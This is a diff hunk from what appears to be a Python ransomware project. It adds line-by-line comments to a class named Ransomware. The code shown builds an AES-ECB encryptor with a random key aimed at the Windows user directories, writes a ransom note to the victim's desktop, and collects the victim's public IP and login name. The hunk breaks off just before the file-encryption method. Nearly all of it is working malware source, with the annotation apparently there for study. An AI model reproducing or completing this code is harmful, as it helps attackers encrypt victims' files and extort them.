@@ -45,32 +45,32 @@ otherFileTypes = ['.exe', '.php', '.pl', '.7z', '.rar', '.m4a', '.wma', '.avi', 
 '''
 
 #Define RW Class for functionality
-class Ransomware(PyQt5.QtCore.QRunnable):
-    def __init__(self):
-        super(Ransomware, self).__init__()
-        self.threadpool = PyQt5.QtCore.QThreadPool()
-        self.randomId = self.rID(12)
-        self.encryptionPass = self.rSeed(32)
-        self.filePath = "C:\\Users\\"
-        self.ip = ""
-        self.userName = ""
-        key = self.encryptionPass.encode()
-        self.crypto = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor()
+class Ransomware(PyQt5.QtCore.QRunnable):           # defines class that inherits from pyqt, runnable object 4 multithreading
+    def __init__(self):                             # Constructor, inits Ransomware object in pyqt multithread envriroment
+        super(Ransomware, self).__init__()          # calls the constructor of qrunnable for intialization
+        self.threadpool = PyQt5.QtCore.QThreadPool()# creates an instance of Qthreadpool( manages pools of threads)
+        self.randomId = self.rID(12)                # generates a randID 12 length using rID method
+        self.encryptionPass = self.rSeed(32)        # generates random seed 32 length using rSeed
+        self.filePath = "C:\\Users\\"               # sets file path attribute 
+        self.ip = ""                                # inits ip attribute to empty string 4 later
+        self.userName = ""                          # inits userName attribute to empty string 4 later
+        key = self.encryptionPass.encode()          # encodes encryption pass into bytes to be used as key for encryption
+        self.crypto = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend()).encryptor() # creates instance of AES enc algo, operates in ECB mode using default backend
 
     # Write ransomware note on victims desktop
-    def readMe(self):
-        try:
-            with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt", "w+") as f:
-                f.write(note)
-        except Exception as e:
+    def readMe(self):                               # defines method within class
+        try:                                        # start of try block
+            with open(f"C:\\Users\\{self.userName}\\Desktop\\readme.txt", "w+") as f: # opens file in r+w mode, if doesnt exit, will create it
+                f.write(note)                       # writes the content of the note
+        except Exception as e:                      # error catch
             print(f"Error writing readme.txt: {e}")
             
     # Retrieve details about victim's system
-    def getUserDetails(self):
-        try:
-            self.ip = requests.get("https://api.ipify.org?format=json").json()["ip"]
-            self.userName = os.getlogin()
-        except Exception as e:
+    def getUserDetails(self):                       # Declares method 
+        try:                                        # try block
+            self.ip = requests.get("https://api.ipify.org?format=json").json()["ip"] # sends get request to endpoint, which gets the public IP, parsed as JSON, extracted and assigned to self.ip
+            self.userName = os.getlogin()           # uses the function to retrieve login name of user and assign it to attribute 
+        except Exception as e:                      # error catch
             print(f"Error getting user details: {e}")
 
     #Encrypt file using AES Encryption
